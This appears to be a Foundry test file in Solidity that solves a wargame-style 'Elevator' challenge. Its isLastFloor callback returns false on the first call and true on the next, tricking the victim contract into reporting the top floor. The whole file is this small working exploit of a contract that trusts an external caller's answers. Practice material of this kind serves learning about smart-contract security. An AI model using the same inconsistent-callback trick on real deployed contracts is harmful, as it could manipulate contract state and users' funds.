// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Elevator.sol";

contract CounterTest is Test {
    Elevator public victim;

    uint8 count;

    function setUp() public {
        victim = new Elevator();
    }

    function test_ReachTopFloor() public {
        victim.goTo(1);
        assertEq(victim.top() == true ? 1 : 0, 1);
    }

    function isLastFloor(uint) external returns (bool) {
        if (count == 0) {
            count++;
            return false;
        }
        return true;
    }
}
